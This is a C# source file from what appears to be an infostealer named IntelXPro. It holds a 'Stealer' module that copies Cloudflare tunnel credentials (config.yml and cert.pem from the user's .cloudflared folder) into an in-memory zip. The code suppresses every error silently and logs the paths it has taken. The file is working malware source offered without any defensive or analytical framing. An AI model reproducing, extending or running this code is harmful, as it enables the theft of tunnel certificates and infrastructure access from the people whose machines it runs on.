using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class CloudflareTunnel : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".cloudflared");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "CloudflareTunnel";

            bool foundData = false;

            if (Directory.Exists(userProfilePath))
            {
                try
                {
                    string[] configFiles = new string[]
                    {
                        "config.yml",
                        "cert.pem"
                    };

                    foreach (string configFile in configFiles)
                    {
                        string fullPath = Path.Combine(userProfilePath, configFile);
                        if (File.Exists(fullPath))
                        {
                            string zipPath = $"Applications\\CloudflareTunnel\\{configFile}";
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                            counterApplications.Files.Add(fullPath + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
                catch
                {
                }
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
